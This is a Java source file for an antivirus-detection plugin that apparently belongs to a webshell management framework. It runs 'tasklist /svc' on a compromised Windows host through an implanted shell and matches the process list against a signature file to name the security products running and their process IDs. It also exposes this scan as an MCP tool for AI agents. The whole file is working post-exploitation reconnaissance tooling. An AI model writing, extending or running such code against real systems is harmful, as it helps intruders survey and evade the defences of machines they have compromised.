package shells.plugins.java;

import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import core.EasyI18N;
import core.annotation.McpParam;
import core.annotation.McpTool;
import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.ShellAvscan;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import javax.swing.JPanel;
import util.functions;

@PluginAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "ShellAvscan",
        DisplayName = "杀软识别"
)
public class ShellAvscanPlugin implements Plugin {
    private JPanel view;
    private ShellEntity shellEntity;

    public ShellAvscanPlugin() {
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        ShellAvscan panel = new ShellAvscan(shellEntity);
        EasyI18N.installObject(panel);
        this.view = panel;
    }

    @Override
    public JPanel getView() {
        return this.view;
    }

    @McpTool(name = "scan", desc = "识别目标 Windows 系统上的杀毒软件 (tasklist /svc + av.json 特征库)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID") })
    public String mcpScan(Map<String, Object> args) {
        if (this.shellEntity == null || this.shellEntity.getPayloadModule() == null) {
            return "Shell 上下文未初始化";
        }
        if (!this.shellEntity.getPayloadModule().isWindows()) {
            return "仅支持 Windows 系统的杀软识别";
        }
        try {
            String cmdResult = this.shellEntity.getPayloadModule().execCommand("cmd.exe /c tasklist /svc").toLowerCase();
            InputStream in = ShellAvscanPlugin.class.getResourceAsStream("/data/av.json");
            if (in == null) return "缺少特征库 /data/av.json";
            String extractBody = new String(functions.readInputStream(in), StandardCharsets.UTF_8);
            JSONObject json = JSONUtil.parseObj(extractBody);
            StringBuilder sb = new StringBuilder();
            int i = 0;
            for (String key : json.keySet()) {
                String lkey = key.toLowerCase();
                String value = json.getStr(key);
                if (!cmdResult.contains(lkey)) continue;
                int index = cmdResult.indexOf(lkey);
                if (index <= 0 || cmdResult.charAt(index - 1) != '\n') continue;
                i++;
                String[] pidTmp = cmdResult.split(lkey, 2)[1].split(" ");
                String pid = "0";
                for (String s : pidTmp) {
                    if (s.length() > 0) {
                        if (functions.isNumeric(s)) {
                            pid = s;
                            break;
                        }
                        pid = "0";
                    }
                }
                // av.json 为 UTF-8 特征库, 值原样输出 (isMessyCode 对纯中文+数字误判, 禁止转换)
                sb.append(i).append(". ").append(key).append(" (PID ").append(pid).append(") => ").append(value).append("\n");
            }
            return sb.length() == 0 ? "未检测到已知杀毒软件" : sb.toString().trim();
        } catch (Exception e) {
            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
    }
}
